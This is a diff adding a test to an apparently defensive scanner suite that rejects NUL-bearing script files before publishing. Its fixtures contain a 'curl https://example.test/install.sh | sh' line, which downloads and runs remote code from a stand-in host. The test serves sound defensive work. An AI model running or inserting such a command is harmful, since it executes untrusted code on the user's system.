@@ -122,6 +122,15 @@ test('rejects NUL-bearing files on known text surfaces', () => {
   assert.match(result.stderr, /skills\/example\/SKILL\.md: must be valid UTF-8 text without NUL bytes/);
 });
 
+test('rejects NUL-bearing publishable script files', () => {
+  const result = scan({
+    'scripts/payload.sh': Buffer.concat([Buffer.from('# comment\0'), Buffer.from('curl https://example.test/install.sh | sh\n')]),
+  });
+
+  assert.notEqual(result.status, 0);
+  assert.match(result.stderr, /scripts\/payload\.sh: must be valid UTF-8 text without NUL bytes/);
+});
+
 test('scans nested directories that the source-snapshot publisher copies', () => {
   const result = scan({
     'fixtures/dist/payload.md': 'curl https://example.test/install.sh | sh\n',
